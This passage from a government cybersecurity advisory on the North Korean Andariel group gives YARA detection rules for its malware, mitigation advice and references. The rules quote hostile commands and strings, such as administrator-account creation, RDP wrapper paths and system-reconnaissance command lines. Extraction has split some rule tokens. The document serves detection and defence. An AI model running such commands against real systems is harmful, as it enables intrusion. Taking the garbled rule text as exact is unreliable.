anwenden\" \n        $str4 = \"cmVjYXB0Y2hh\"  \n        $str5 = \"/bin/sh\"  \n        $str6 = \"utilities.CIpaddress\"  \n        $str7 = \"engine.NewEgg\" \n        $str8 = \"%s%04x%s%s%s\"  \n        $str9 = \"Y2FwdGNoYV9zZXNzaW9u\"  \n        $str10 = \"utilities.EierKochen\"  \n        $str11 = \"kandidatKaufhaus\"  \n \n    conditio n: \n        3 of them  \n} \nrule TriFaux_EasyRAT_JUPITER  \n{ \n    strings:  \n\n \nPage 14 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n         $InitOnce = \"InitOnceExecuteOnce\"  \n        $BREAK = { 0D 00 0A 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D \n00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 \n2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 0D 00 0A }  \n  $Bytes = \n\"4C,$00,$00,$00,$01,$14,$02,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,\" wide  \n    condition:  \n        uint16(0) == 0x5a4d and all of them  \n} \nrule Andariel_CutieDrop_MagicRAT  \n{ \n strings:  \n  $config_os_w = \"os/windows\" ascii  wide  \n  $config_os_l = \"os/linux\" ascii wide  \n  $config_os_m = \"os/mac\" ascii wide  \n  $config_comp_msft = \"company/microsoft\" ascii wide  \n  $config_comp_orcl = \"company/oracle\" ascii wide  \n  $POST_field_1 = \"session=\" ascii wide  \n  $POST_field_2 = \"type=\" ascii  wide  \n  $POST_field_3 = \"id=\" ascii wide  \n  $command_misspelled = \"renmae\" ascii wide  \n condition:  \n  uint16(0) == 0x5a4d and 7 of them  \nrule Andariel_hhsd_FileTransferTool  \n{ \n     strings:  \n        // 30 4D C7                xor     [ rbp+buffer_v41+3], cl  \n        // 81 7D C4 22 C0 78 00    cmp     dword ptr [rbp+buffer_v41], 78C022h  \n        // 44 88 83 00 01 00 00    mov     [rbx+100h], r8b  \n        $handshake = { 30 ?? ?? 81 7? ?? 22 C0 78 00 4? 88 }  \n         \n        // B1 14                   mov     cl, 14h  \n        // C7 45 F7 14 00 41 00    mov     [rbp+57h+Src], 410014h  \n        // C7 45 FB 7A 00 7F 00    mov     [rbp+57h+var_5C], 7F007Ah  \n        // C7 45 FF 7B 00 63 00    mov     [rbp+57h+var_58], 63007Bh  \n        // C7 45 03 7A 00 3 4 00    mov     [rbp+57h+var_54], 34007Ah  \n        // C7 45 07 51 00 66 00    mov     [rbp+57h+var_50], 660051h  \n        // C7 45 0B 66 00 7B 00    mov     [rbp+57h+var_4C], 7B0066h  \n        // C7 45 0F 66 00 00 00    mov     [rbp+57h+var_48], 66h ; 'f'  \n        $err_xor_str = { 14 C7 [2] 14 00 41 00 C7 [2] 7A 00 7F 00 C7 [2] 7B 00 63 00 C7 [2] 7A 00 34 00 }  \n         \n        // 41 02 D0                add     dl, r8b  \n        // 44 02 DA                add     r11b, dl  \n        // 3C 1F                   cmp     al, 1Fh  \n        $buf_add_cmp_1f = { 4? 02 ?? 4? 02 ?? 3? 1F }  \n        // B9 8D 10 B7 F8          mov     ecx, 0F8B7108Dh  \n        // E8 F1 BA FF FF          call    sub_140001280  \n        $hash_call_loadlib = { B? 8D 10 B7 F8 E8 }  \n        $hash_call_unk = { B? 91 B8 F6 88 E8 }  \n         \n    condition:  \n        uint16(0) == 0x5a4d and  \n\n \nPage 15 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n         (any of ($handshake, $err_xor_str, $buf_add_cmp_1f) and any of ($hash_call_*)) or  \n        2 of ($handshake, $err_xor_str, $buf_add_cmp_1f)  \nrule Andariel_ Atharvan_3RAT  \n{ \nstrings:  \n$3RAT = \"D: \\\\rang \\\\TOOL \\\\3RAT\"  \n$atharvan = \"Atharvan_dll.pdb\"  \ncondition:  \nuint16(0) == 0x5a4d and any of them  \n} \nrule Andariel_LilithRAT_Variant  \n{ \n    strings:  \n        // The following are strings seen in the open source version of  Lilith  \n        $lilith_1 = \"Initiate a CMD session first.\" ascii wide \n        $lilith_2 = \"CMD is not open\" ascii wide  \n        $lilith_3 = \"Couldn't write command\" ascii wide  \n        $lilith_4 = \"Couldn't write to CMD: CMD not open\" ascii wide  \n \n        // The following are strings that appear to be unique to the Unnamed Trojan based on Lilith  \n        $unique_1 = \"Upload Error!\" ascii wide  \n        $unique_2 = \"ERROR: Downloading  is already running!\" ascii wide  \n        $unique_3 = \"ERROR: Unable to open file:\" ascii wide \n        $unique_4 = \"General error\" ascii wide  \n        $unique_5 = \"CMD error\" ascii wide  \n        $unique_6 = \"killing self\" ascii wide  \n    condition:  \n        uint16(0) == 0x5a4d and filesize < 150KB and all of ($lilith_*) and 2 of ($unique_*)  \n} \nrule Andariel_SocksTroy_Strings_OpCodes  \n{ \n       strings:  \n        $strHost = \" -host\" wide  \n        $strAuth = \" -auth\" wide  \n        $SocksTroy = \"SocksTroy\"  \n        $cOpCod eCheck = { 81 E? A0 00 00 00 0F 84 ?? ?? ?? ?? 83 E? 03 74 ?? 83 E? 02 74 ?? 83 F? 0B }  \n    condition:  \n        uint16(0) == 0x5a4d and  \n        ((1 of ($str*)) and  \n        (all of ($c*)) or (all of ($Socks*))) \n} \nrule Andariel_Agni  \n{ \n    strings:  \n        $xor = { 34 ?? 88 01 48 8D 49 01 0F B6 01 84 C0 75 F1 }  \n        $stackstrings = {C7 44 24 [5-10] C7 44 24 [5] C7 44 24 [5- 10] C7 44 24 [5- 10] C7 44 24}  \n    condition:  \n        uint16(0) == 0x5a4d and (#xor > 100 and #stackstrings > 5)  \n} \nrule Andariel_GoLang_validalpha_handshake  \n{ \n    strings:  \n        $ = { 66 C7 00 AB CD C6 40 02 EF ?? 03 00 00 00 48 89 C1 ?? 03 00 00 00 }  \n\n \nPage 16 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n     condition:  \n        all of them  \n} \nrule Andariel_GoLang_validalpha_tasks  \n{ \n    strings:  \n        $ = \"main.Screen MonitThread\"  \n        $ = \"main.CmdShell\"  \n        $ = \"main.GetAllFoldersAndFiles\"  \n        $ = \"main.SelfDelete\"  \n    condition:  \n        all of them  \n} \nrule Andariel_GoLang_validalpha_BlackString  \n{ \n    strings:  \n    $ = \"I:/01___Tools/02__RAT/Black\"  \n    condition:  \n    uint16(0) == 0x5A4D and all of them  \n} \nrule INDICATOR_EXE_Packed_VMProtect  \n        strings:  \n        $s1 = \".vmp0\" fullword ascii  \n        $s2 = \".vmp1\" fullword ascii  \n    condition:  \n        uint16(0) == 0x5a4d and all of them or  \n        for any i in (0 .. pe.number_of_sections) : (  \n            ( \n                pe.sections[i].name == \".vmp0\" or  \n                pe.sections[i].name == \".vmp1\"  \n            ) \n        )  \n} \nrule INDICATOR_EXE_Packed_Themida  \n        strings:  \n        $s1 = \".themida\" fullword ascii  \n    condition:  \n        uint16(0) == 0x5a4d and all of them or  \n        for any i in (0 .. pe.number_of_sections) : (  \n            ( \n                pe.sections[i].name == \".themida\"  \n            ) \n        )  \n} \nrule Andariel_elf_backdoor_fipps  \n{ \nstrings:  \n        $a = \"found mac address\"  \n        $b = \"RecvThread\"  \n        $c = \"OpenSSL -1.0.0 -fipps\"  \n        $d = \"Disconnected!\"  \n    condition:  \n        (all of them) and uint32(0) == 0x464c457f  \n\n \nPage 17 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n } \nrule Andariel_bindshell  \n{ \nstrings:  \n $str_comspec = \"COMSPEC\"  \n $str_consolewindow = \"GetConsoleWindow\"  \n $str_ShowWindow = \"ShowWindow\"  \n $str_WSASocketA = \"WSASocketA\"  \n $str_CreateProcessA = \"CreateProcessA\"  \n $str_port = {B9 4D 05 00 00 89}  \ncondition:  \nuint16(0) == 0x5A4D and all of them  \n} \nrule Andariel_grease2  \n{ \nstrings:  \n $str_rdpconf = \"c: \\\\windows \\\\temp \\\\RDPConf.exe\" fullword nocase  \n $str_rdpwinst = \"c: \\\\windows \\\\temp \\\\RDPWInst.exe\" fullwo rd nocase  \n $str_net_user = \"net user\"  \n $str_admins_add = \"net localgroup administrators\"  \ncondition:  \nuint16(0) == 0x5A4D and  \nall of them  \n} \nrule Andariel_NoPineapple_Dtrack_unpacked  \n{ \nstrings:  \n $str_nopineapple = \"< No Pineapple! >\"  \n $str_qt_library = \"Qt 5.12.10\"  \n $str_xor = {8B 10 83 F6 ?? 83 FA 01 77}  \ncondition:  \nuint16(0) == 0x5A4D and  \nall of them  \n} \nrule Andariel_dtrack_unpacked  \n{ \nstrings:  \n $str_mutex = \"MTX_Global\"  \n $str_cmd_1 = \"/c net use \\ \\\\\\\" wide  \n $str_cmd_2 = \"/c ping -n 3 127.0.01 > NUL % echo EEE > \\ \"%s\\\"\" wide  \n $str_cmd_3 = \"/c move /y %s \\\\\\\\\" wide  \n $str_cmd_4 = \"/c systeminfo > \\\"%s\\\" & tasklist > \\\"%s \\\" & netstat -naop tcp > \\\"%s \\\"\" wide  \ncondition:  \nuint16(0) == 0x5A4D and  \nall of them  \n} \nrule Andariel_TigerRAT_crowdsourced_rule {  \n    strings:  \n        $m1 = \".?AVModuleKeyLogger@@\" fullword ascii  \n        $m2 = \".?AVModulePortForwarder@@\" fullword ascii  \n        $m3 = \".?AVModuleScreenCapture@@\" fullword ascii  \n        $m4 = \".?AVModuleShell@@\" fullword ascii  \n        $s1 = \" \\\\x9891 -009942 -xnopcopie.dat\" fullword wide  \n\n \nPage 18 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n         $s2 = \"(%02d : %02d -%02d %02d:%02d:%02d) --- %s[Clipboard]\" fullword ascii  \n        $s3 = \"[%02d : %02d -%02d %02d:%02d:%02d] --- %s[Title]\" fullword ascii  \n        $s4 = \"del \\\"%s \\\"%s \\\"%s \\\" goto \" ascii  \n        $s5 = \"[<<]\" fullword ascii  \n    condition:  \n        uint16(0) == 0x5a4d and (all of ($s*) or (all of ($m*) and 1 of ($s*)) or (2 of ($m*) and 2 of ($s*)))  \n} \nrule win_tiger_rat_auto {  \n    strings:  \n        $sequence_0 = { 33c0 8 9442438 89442430 448bcf 4533c0 }  \n            // n = 5, score = 200  \n            //   33c0                 | jmp                 5  \n            //   89442438             | dec                 eax  \n            //   89442430             | mov                 eax, ecx  \n            //   448bcf               | movzx               eax, byte ptr [eax]  \n            //   4533c0               | dec                 eax  \n \n        $sequence_1 = { 41b901000000 488bd 6 488bcb e8???????? }  \n            // n = 4, score = 200  \n            //   41b901000000         | dec                 eax  \n            //   488bd6               | mov                 eax, dword ptr [ecx]  \n            //   488bcb               | jmp                 8  \n            //   e8????????           |                      \n \n        $sequence_2 = { 4881ec90050000 8b01 8985c8040000 8b4104 }  \n            // n = 4, score = 200  \n            //   4881ec90050000       | test                eax, eax  \n            //   8 b01                 | jns                 0x16  \n            //   8985c8040000         | dec                 eax  \n            //   8b4104               | mov                 eax, dword ptr [ecx]  \n \n        $sequence_3 = { 488b01 ff10 488b4f08 4c8d4c2430 }  \n            // n = 4, score = 200  \n            //   488b01               | mov                 edx, esi  \n            //   ff10                 | dec                 eax  \n            //   488b4f08             | mov                 ecx, ebx  \n            //   4c8d4c24 30           | inc                 ecx  \n \n        $sequence_4 = { 488b01 ff10 488b4e18 488b01 }  \n            // n = 4, score = 200  \n            //   488b01               | dec                 eax  \n            //   ff10                 | cmp                 dword ptr [ecx + 0x18], 0x10  \n            //   488b4e18             | dec                 eax  \n            //   488b01               | sub                 esp, 0x590  \n \n        $sequence_5 = { 4881eca 0000000 33c0 488bd9 488d4c2432 }  \n            // n = 4, score = 200  \n            //   4881eca0000000       | mov                 eax, dword ptr [ecx]  \n            //   33c0                 | mov                 dword ptr [ebp + 0x4c8], eax  \n            //   48 8bd9               | mov                 eax, dword ptr [ecx + 4]  \n            //   488d4c2432           | mov                 dword ptr [ebp + 0x4d0], eax  \n \n        $sequence_6 = { 488b01 eb03 488bc1 0fb600 }  \n\n \nPage 19 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n             // n = 4, score = 200  \n            //   488b01               | inc                 ecx  \n            //   eb03                 | mov                 ebx, dword ptr [ebp + ebp]  \n            //   488bc1               | inc                 ecx  \n            //   0fb600               | movups              xmmword ptr [edi], xmm0  \n \n        $sequence_7 = { 488b01 8b10 895124 448b4124 4585c0 }  \n            // n = 5, score = 200  \n            //   488b01               | sub                 esp, 0x30  \n            //   8b10                 | dec                 e cx \n            //   895124               | mov                 ebx, eax  \n            //   448b4124             | dec                 eax  \n            //   4585c0               | mov                 ecx, eax  \n         $sequence_8 = { 4c8d0d31eb0000 c1e918 c1e8 08 41bf00000080 }  \n            // n = 4, score = 100  \n            //   4c8d0d31eb0000       | jne                 0x1e6  \n            //   c1e918               | dec                 eax  \n            //   c1e808               | lea                 ecx, [0xbda0]  \n            //   41bf00000080         | dec                 esp  \n \n        $sequence_9 = { 488bd8 4885c0 752d ff15???????? 83f857 0f85e0010000 488d0da0bd0000 }  \n            // n = 7, sc ore = 100  \n            //   488bd8               | dec                 eax  \n            //   4885c0               | mov                 ebx, eax  \n            //   752d                 | dec                 eax  \n            //   ff15????????         |                      \n            //   83f857               | test                eax, eax  \n            //   0f85e0010000         | jne                 0x2f  \n            //   488d0da0bd0000       | cmp                 eax, 0x57  \n \n        $sequence_10 = { 75d4 488d1d7f6 c0100 488b4bf8 4885c9 740b }  \n            // n = 5, score = 100  \n            //   75d4                 | lea                 ecx, [0xeb31]  \n            //   488d1d7f6c0100       | shr                 ecx, 0x18  \n            //   488b4bf8             | shr                 eax, 8  \n            //   4885c9               | inc                 ecx  \n            //   740b                 | mov                 edi, 0x80000000 \n \n        $sequence_11 = { 0f85d9000000 488d15d0c90000 41b810200100 488bcd e8???????? eb6b \nb9f4ffff ff } \n            // n = 7, score = 100  \n            //   0f85d9000000         | jne                 0xffffffd6  \n            //   488d15d0c90000       | dec                 eax  \n            //   41b810200100         | lea                 ebx, [0x16c7f]  \n            //   488bcd               | dec                 eax  \n            //   e8????????           |                      \n            //   eb6b                 | mov                 ecx, dword ptr [ebx - 8] \n            //   b9f4ffffff           | dec                 eax  \n \n        $sequence_12 = { 48890d???????? 488905???????? 488d05ae610000 488905???????? \n488d05a0550000 488905???????? }  \n            // n = 6, score = 100  \n\n \nPage 20 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n             //   48890d????????       |                      \n            //   488905????????       |                      \n            //   488d05ae610000       | test                ecx, ecx  \n            //   488905????????       |                      \n            //   488d05a0550000       | je                  0x10  \n            //   488905????????       |                      \n \n        $sequence_13 = { 8bcf e8???????? 488b7c2448 85c0 0f8440030000 488d0560250100 }  \n            // n = 6, score = 100  \n            //   8bcf                 | mov                 eax, 0x12010  \n            //   e8????????           |                      \n            //   488b7c2448           | dec                 eax  \n            //   85c0                 | mov                 ecx, ebp  \n            //   0f8440030000         | jmp                 0x83  \n            //   488d0560250100       | mov                 ecx, 0xfffffff4  \n         $sequence_14 = { ff15???????? 8b05???????? 2305???????? ba02000000 33c9 8905???????? \n8b05???????? }  \n            // n =  7, score = 100  \n            //   ff15????????         |                      \n            //   8b05????????         |                      \n            //   2305????????         |                      \n            //   ba02000000           | dec                 eax  \n            //   33c9                 | lea                 eax, [0x61ae]  \n            //   8905????????         |                      \n            //   8b05????????         |                      \n \n        $sequence_15 = { 4883ec30 498bd8 e8???????? 488bc8 4885c0 }  \n            // n = 5, score = 100  \n            //   4883ec30             | jne                 0xdf  \n            //   498bd8                | dec                 eax  \n            //   e8????????           |                      \n            //   488bc8               | lea                 edx, [0xc9d0]  \n            //   4885c0               | inc                 ecx  \n     condition:  \n        7 of them and filesize < 557056  \n} \nrule win_dtrack_auto {  \n    strings:  \n        $sequence_0 = { 52 8b4508 50 e8???????? 83c414 8b4d10 51 }  \n            // n = 7, score = 400  \n            //   52                   | push                edx  \n            //   8b4508               | mov                 eax, dword ptr [ebp + 8]  \n            //   50                   | push                eax  \n            //   e8????????           |                      \n            //   83c414               | add                 esp, 0x14  \n            //   8b4d10               | mov                 ecx, dword ptr [ebp + 0x10]  \n            //   51                   | push                ecx  \n         $sequence_1 = { 3a4101 7523 83854cf6ffff02 838550f6ffff02 80bd4af6ffff00 75ae \nc78544f6ffff00000000 }  \n            // n = 7, score = 300  \n\n \nPage 21 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n             //   3a4101               | cmp                 al, byte ptr [ecx + 1]  \n            //   7523                 | jne                 0x25  \n            //   83854cf6ffff02       | add                 dword ptr [ebp - 0x9b4], 2  \n            //   838550f6ffff02       | add                 dword ptr [ebp - 0x9b0], 2  \n            //   80 bd4af6ffff00       | cmp                 byte ptr [ebp -  0x9b6], 0  \n            //   75ae                 | jne                 0xffffffb0  \n            //   c78544f6ffff00000000     | mov    dword ptr [ebp - 0x9bc], 0  \n \n        $sequence_2 = { 50 ff15????????  a3???????? 68???????? e8???????? 83c404 50 }  \n            // n = 7, score = 300  \n            //   50                   | push                eax  \n            //   ff15????????         |                      \n            //   a3????????           |                      \n            //   68????????           |                      \n            //   e8????????           |                      \n            //   83c404               | add                 esp, 4  \n            //   50                   | push                eax  \n \n        $sequence_3 = { 8d8dd4faffff 51 e8???????? 83c408 8b15???????? }  \n            // n = 5, score = 300  \n            //   8d8dd4faffff         | lea                 ecx, [ebp - 0x52c]  \n            //   51                   | push                ecx  \n            //   e8????????           |                      \n            //   83c408               | add                 esp, 8  \n            //   8b15????????         |                      \n         $sequence_4 = { 8855f5 6a5c 8b450c 50 e8???????? }  \n            // n = 5, score = 300  \n            //   8855f5               | mov                 byte ptr [ebp - 0xb], dl \n            //   6a5c                 | push                0x5c  \n            //   8b450c               | mov                 eax, dword ptr [ebp + 0xc]  \n            //   50                   | push                eax  \n            //   e8????????           |                      \n \n        $sequence_5 = { 51 e8???????? 83c410 8b558c 52 }  \n            // n = 5, score = 300  \n            //   51                   | push                ecx  \n            //   e8????????           |                      \n            //   83c410               | add                 esp, 0x10  \n            //   8b558c               | mov                 edx, dword ptr [ebp - 0x74]  \n            //   52                   | push                edx  \n \n        $sequence_6 = { 8b4d0c 51 68???????? 8d9560eaffff 52 e8???????? }  \n            // n = 6, score = 300  \n            //   8b4d0c               | mov                 ecx, dword ptr [ebp + 0xc]  \n            //   51                   | push                ecx  \n            //   68????????           |                      \n            //   8d9560eaffff         | lea                 edx, [e bp - 0x15a0]  \n            //   52                   | push                edx  \n            //   e8????????           |                      \n         $sequence_7 = { 83c001 8945f4 837df420 7d2c 8b4df8 }  \n            // n = 5, score = 300  \n\n \nPage 22 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n             //   83c001               | add                 eax, 1  \n            //   8945f4               | mov                 dword ptr [ebp - 0xc], eax  \n            //   837df420             | cmp                 dword pt r [ebp -  0xc], 0x20  \n            //   7d2c                 | jge                 0x2e  \n            //   8b4df8               | mov                 ecx, dword ptr [ebp - 8] \n \n        $sequence_8 = { 83c001 89856cf6ffff 8b8d70f6ffff 8a11 }  \n            // n = 4,  score = 300 \n            //   83c001               | add                 eax, 1  \n            //   89856cf6ffff         | mov                 dword ptr [ebp -  0x994], eax  \n            //   8b8d70f6ffff         | mov                 ecx, dword ptr [ebp - 0x990 ] \n            //   8a11                 | mov                 dl, byte ptr [ecx]  \n         $sequence_9 = { 0355f0 0fb602 0fb64df7 33c1 0fb655fc 33c2 }  \n            // n = 6, score = 200  \n            //   0355f0               | add                 edx, dword p tr [ebp - 0x10]  \n            //   0fb602               | movzx               eax, byte ptr [edx]  \n            //   0fb64df7             | movzx               ecx, byte ptr [ebp - 9] \n            //   33c1                 | xor                 eax, ecx  \n            //   0fb655fc             | movzx               edx, byte ptr [ebp - 4] \n            //   33c2                 | xor                 eax, edx  \n         $sequence_10 = { d1e9 894df8 8b5518 8955fc c745f000000000 }  \n            // n = 5, score = 200  \n            //   d1e9                 | shr                 ecx, 1  \n            //   894df8               | mov                 dword ptr [ebp - 8], ecx  \n            //   8b5518               | mov                 edx, dword  ptr [ebp + 0x18]  \n            //   8955fc               | mov                 dword ptr [ebp - 4], edx  \n            //   c745f000000000       | mov                 dword ptr [ebp - 0x10], 0  \n         $sequence_11 = { 8b4df0 3b4d10 0f8d90000000 8b5508 0355f0 0fb602 }  \n            // n = 6, score = 200  \n            //   8b4df0               | mov                 ecx, dword ptr [ebp - 0x10]  \n            //   3b4d10               | cmp                 ecx, dword ptr [ebp + 0x10]  \n            //   0f8d90000000         | jge                 0x96  \n            //   8b5508               | mov                 edx, dword ptr [ebp + 8]  \n            //   0355f0               | add                 edx, dword ptr [ebp - 0x10]  \n            //   0fb602               | movzx               eax, byte ptr [edx]  \n \n        $sequence_12 = { 894d14 8b45f8 c1e018 8b4dfc c1e908 0bc1 }  \n            // n = 6, score = 200  \n            //   894d14               | mov                 dword ptr [ebp + 0x14], ecx  \n            //   8b45f8               | m ov                 eax, dword ptr [ebp - 8] \n            //   c1e018               | shl                 eax, 0x18  \n            //   8b4dfc               | mov                 ecx, dword ptr [ebp - 4] \n            //   c1e908               | shr                 ecx, 8  \n            //   0bc1                 | or                  eax, ecx  \n \n        $sequence_13 = { 0bc1 894518 8b5514 8955f8 }  \n            // n = 4, score = 200  \n            //   0bc1                 | or                  eax, ecx  \n            //   894518               | mov                 dword ptr [ebp + 0x18], eax  \n            //   8b5514               | mov                 edx, dword ptr [ebp + 0x14]  \n\n \nPage 23 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n             //   8955f8               | mov                 dword ptr [ebp - 8], edx \n \n        $sequence_14 = { 8b5514 8955f8 8b4518 8945fc e9???????? 8be5 }  \n            // n = 6, score = 200  \n            //   8b5514               | mov                 edx, dword ptr [ebp + 0x14] \n            //   8955f8               | mov                 dword ptr [ebp - 8], edx  \n            //   8b4518               | mov                 eax, dword ptr [ebp + 0x18] \n            //   8945fc               | mov                 dword ptr [ebp - 4], eax  \n            //   e9????????           |                      \n            //   8be5                 | mov                 esp, ebp  \n    condition:  \n        7 of them and filesize < 1736704 \n} \nMitigation Measures  \nThe authoring agencies recommend implementing the mitigations below to improve your organizations \ncybersecurity posture based on the threat actors activity.  \nLog4Shell and Other Log4j Vulnerabilities  \nDefenders should consult the joint Cybersecurity Advisory titled  Mitigating Log4Shell and Other Log4j-\nRelated Vulnerabilities  and CISAs  Apache Log4j Vulnerability  guidance. Organizations can mitigate the \nrisks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j -related \nvulnerabilities and upgrading Log4j assets and affect ed products to the latest version.  \nNote:  CVE -2021-44228 Log4Shell was disclosed in December 2021 and affects the Log4j library prior to \nversion 2.17.0.  \nDefenders should remain alert to vendor software updates, and initiate hunt and incident response \nprocedures to detect possible Log4Shell exploitation.  \nWeb Shell Malware  \nWeb shell malware is deployed by adversaries on a victims web server to execute arbitrary system commands. The NSA and Australian Signals Directorates report titled \nDetect and Prevent Web Shell \nMalware  provides mitigating actions to identify and recover from web shells.   \nPreventing exploitation of web -facing servers often depends on maintaining an inventory of systems and \napplications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application \nFirewalls (WAFs).  \nEndpoint Activity  \nPreventing and detecting further adversary activity should focus on deploying endpoint agen ts or other \nmonitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server t o critical assets.  \n\n \nPage 24 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Command Line Activity and Remote Access  \nMonitoring for suspicious command -line activity, implementing multi -factor authentication for remote \naccess services, and properly segmenting and using allow -listing tools for critical assets can protect \nagainst malicious activity by RGB 3rd Bureaus Andariel group and other cyber threat actors.  \nPacking  \nSignatures for Themida, VMProtect and a number of other packers are available here ; however, the \nsignatures will not identify every file packed using these applications.  \nAdditional Mitigation Measures for Malicious Activities  \n Check for security vulnerabilities, apply patches , and update to the latest version of software  \n Encrypt all sensitive data including personal information  \n Block access to unused ports \n Change passwords when they are suspected of being compromised  \n Alert on unexpected use of dual -use applications  \n Strengthen the subscriber identity authentication process for leased servers  \nDPRK Rewards for Justice  \nThe U.S. and ROK Governments encourage victims to report suspicious activities, including those related to \nsuspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have \ninformation about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such \ninformation through the Department of States Rewards for Justice program could make you eligible to receive an award of up to $ 10 million. For further details, please visit https://rewardsforjustice.net/\n. \nAcknowled gements  \nMandiant and Microsoft Threat Intelligence contributed to this CSA.  \nDisclaimer of Endorsement  \nYour organization has no obligation to respond or provide information in response to this product.  If, after reviewing the information provided, your o rganization decides to provide information to the authorizing \nagencies, it must do so consistent with applicable state and federal law.  \nThe information in this report is being provided as is for informational purposes only. The authoring \nagencies do not endorse any commercial product or service, including any subjects of analysis. Any \nreference to specific commercial products, processes, or service by service mark, trademark, \nmanufacturer, or otherwise, does not constitute or imply endorsement, recommenda tion, or favoring by the \nco-authors.  \n\n \nPage 25 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Version Histo ry \nJuly 25, 2024: Initial version.  \nAugust 6, 2024: Updated Credential Access and Commodity Malware and Dual-Use Applications \nsections.  \nTrademark Recognition  \nActive Directory, Microsoft, PowerShell, and Windows are registered trademarks of Microsoft \nCorporation. MITRE and ATT&CK are registered trademarks of The MITRE Corporation.   \nPurpose  \nThis document was developed in furtherance of the authoring agencies cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate \nstakeholders.  \nContact  \nU.S. organizations:  Urgently  report any anomalous activity or incidents, including based upon technical \ninformation associated w ith this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report \nor to the FBI via your local FBI field office listed at https://www.fbi.gov/contact -us/fieldoffices .  \nDC3 Cyber Forensics Laboratory (CFL): afosi.dc3.cflintake@us.af.mil   \nDoD-Defense Industrial Base (DIB) Collaborative Information Sharing Environment (DCISE): \ndc3.dcise@us.af.mil   \nNSA Cybersecurity Report Question s and Feedback: CybersecurityReports@nsa.gov   \nNSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@ cyber.nsa.gov   \nNSA Media Inquiries / Press Desk: 443-634 -0721, MediaRelations@nsa.gov     \nRepublic of Korea organizations:  If you suspect cyber incidents involving state actors, including Andariel, or \ndiscover similar cases, please contact the relevant authorities below.  \nNational Intelligence Service: www.nis.go.kr , +82 111 \nReferences  \nAhnLab Security Emergency Response Center:  \n https://asec.ahnlab.com/en/56405/    \n https://asec.ahnlab.com/en/59073/   \n https://asec.ahnlab.com/en/66088/   \nBoredhackerblog: http://www.boredhackerblog.info/2022/11/openssl -100 -fipps -linux -backdoor -\nnotes.html     \n\n \nPage 26 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Cisco Talos Intelligence blogs:  \n https://blog.talosintelligence.com/lazarus -three -rats/    \n https://blog.talosintelligence.com/lazarus -magicrat/   \n https://blog.talosintelligence.com/lazarus -collectionrat/   \n https://blog.talosintelligence.com/lazarus -quiterat/   \nDCSO blog: https://medium.com/@DCSO_CyTec/andariels -jupiter -malware -and-the-case -of-the-curious- c2-\ndbfe29f57499    \nGithub.com/ditekshen: https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar    \nJPCERT blogs:  \n https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html    \n https://blogs.jpcert.or.jp/en/2022/07/yamabot.html    \nMandiant blogs:  \n https://www.mandiant.com/resources/blog/north -korea -cyber- structure -alignment -2023    \n https://www.mandiant.com/resources/blog/mapping -dprk -groups -to-government    \nMicrosoft blogs:  \n https://www.microsoft.com/en- us/security/blog/2023/10/18/multiple-north -korean -threat-actors -\nexploiting-the -teamcity -cve-2023- 42793-vulnerability/    \n https://www.microsoft.com/en- us/security/blog/2022/07/14/north -korean -threat-actor -targets -\nsmall -and-midsize -businesses -with -h0lygh0st -ransomware/  \nNCSC Guidance  \n Alert: Apache Log4j Vulnerabilities: https://www.ncsc.gov.uk/news/apache -log4j -vulnerability   \n Information: https://www.ncsc.gov.uk/information/log4j -vulnerability -what -everyone-needs -to-know   \nSymantec blog: https ://symantec-enterprise -blogs.security.com/blogs/threat -intelligence/clasiopa -\nmaterials -research   \nVMware blog: https: //blogs.vmware.com/security/2021/12/tigerrat -advanced -adversaries -on-the-\nprowl.html    \nWithSecure Labs report: https://labs.withsecure.com/publications/no-pineapple -dprk -targeting -of-medical -\nresearch -and-technology -sector    \n  \n\n \nPage 27 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Appendix: MITRE ATT&CK Techniques and Software  \nThe tactics and techniques referenced in t his advisory are identified in Table 3   Table 12 . \nTable 3 . Reconnaissance and Enumeration  \nTechnique Title  ID Use \nGather Victim Org \nInformation  T1591  The actors gather information about the victims organization that can be used during targeting.  \nGather Victim Host \nInformation  T1592  The actors gather information about the victims hosts that can be used \nduring targeting.  \nActive Scanning  T1595  The actors execute active reconnaissance scans to gather information that can be used during targeting.  \nSearch Open Technical \nDatabases  T1596  The actors search freely available technical databases for information \nabout victims that can be used during targeting.  \nTable 4 . Resource Development, Tooling, and Remote Access 